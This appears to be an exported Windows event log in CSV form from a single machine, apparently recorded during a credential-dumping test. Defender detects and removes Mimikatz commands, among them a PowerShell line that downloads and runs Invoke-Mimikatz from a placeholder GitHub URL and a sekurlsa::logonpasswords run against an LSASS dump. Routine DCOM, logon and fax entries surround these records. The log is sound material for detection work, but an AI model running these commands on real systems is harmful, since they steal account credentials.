Level,Date and Time,Source,Event ID,Task Category,More Information
Warning,15/04/2020 14:34,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
 	Name: Trojan:PowerShell/Mimikatz.A
 	ID: 2147725502
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Warning,15/04/2020 14:34,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
{C2F03A33-21F5-47FA-B4BB-156362A2F239}
 and APPID 
{316CDED5-E4AE-4B15-9113-7055D84DCC97}
 to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
Information,15/04/2020 14:34,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
Warning,15/04/2020 14:34,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz.I&threatid=2147741009&enterprise=0
 	Name: HackTool:Win32/Mimikatz.I
 	ID: 2147741009
 	Severity: High
 	Category: Tool
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c ATOMICS_T1003_mimikatz_EXECUTABLE sekurlsa::minidump LSAAS_DMP sekurlsa::logonpasswords full exit
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Warning,15/04/2020 14:34,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
{C2F03A33-21F5-47FA-B4BB-156362A2F239}
 and APPID 
{316CDED5-E4AE-4B15-9113-7055D84DCC97}
 to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
Information,15/04/2020 14:35,Service Control Manager,7040,None,The start type of the Background Intelligent Transfer Service service was changed from demand start to auto start.
Information,15/04/2020 14:36,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		BUILTIN\Administrators
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1a0
	Process Name:		C:\Windows\System32\svchost.exe"
Information,15/04/2020 14:36,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		BUILTIN\Backup Operators
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1a0
	Process Name:		C:\Windows\System32\svchost.exe"
Information,15/04/2020 14:36,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		SYSTEM
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x258
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
Information,15/04/2020 14:36,Microsoft-Windows-Security-Auditing,4672,Special Logon,"Special privileges assigned to new logon.

Subject:
	Security ID:		SYSTEM
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege"
Information,15/04/2020 14:36,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
 	Name: Trojan:PowerShell/Mimikatz.A
 	ID: 2147725502
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Remove
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 14:36,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
Information,15/04/2020 14:36,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
Information,15/04/2020 14:37,Microsoft-Windows-Kernel-General,16,None,The access history in hive \??\C:\Users\User\AppData\Local\Packages\Microsoft.WindowsCalculator_8wekyb3d8bbwe\Settings\settings.dat was cleared updating 2 keys and creating 1 modified pages.
Error,15/04/2020 14:37,Microsoft-Windows-DistributedCOM,10028,None,"DCOM was unable to communicate with the computer computer1 using any of the configured protocols; requested by PID      4c0 (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe), while activating CLSID {49B2791A-B1AE-4C90-9B8E-E860BA07F889}."
Error,15/04/2020 14:37,Microsoft-Windows-DistributedCOM,10028,None,"DCOM was unable to communicate with the computer Target using any of the configured protocols; requested by PID      7c4 (C:\Windows\System32\Wbem\WMIC.exe), while activating CLSID {8BC3F05E-D86B-11D0-A075-00C04FB68820}."
Information,15/04/2020 14:37,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz.I&threatid=2147741009&enterprise=0
 	Name: HackTool:Win32/Mimikatz.I
 	ID: 2147741009
 	Severity: High
 	Category: Tool
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c ATOMICS_T1003_mimikatz_EXECUTABLE sekurlsa::minidump LSAAS_DMP sekurlsa::logonpasswords full exit
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Remove
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 14:37,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
Warning,15/04/2020 14:37,Microsoft Fax,32026,-1,Fax Service failed to initialize any assigned fax devices. No faxes can be sent or received until a fax device is installed.
Warning,15/04/2020 14:37,Microsoft Fax,32068,-1,The outgoing routing rule is not valid because it cannot find a valid device. Check the routing rule configuration. Country/region code: '*' Area code: '*'
Information,15/04/2020 14:37,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

User:
	Security ID:		DESKTOP-P8HTU4V\CISADMIN
	Account Name:		Administrator
	Account Domain:		DESKTOP-P8HTU4V

Process Information:
	Process ID:		0xe80
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
Information,15/04/2020 14:37,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

User:
	Security ID:		DESKTOP-P8HTU4V\DefaultAccount
	Account Name:		DefaultAccount
	Account Domain:		DESKTOP-P8HTU4V

Process Information:
	Process ID:		0xe80
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
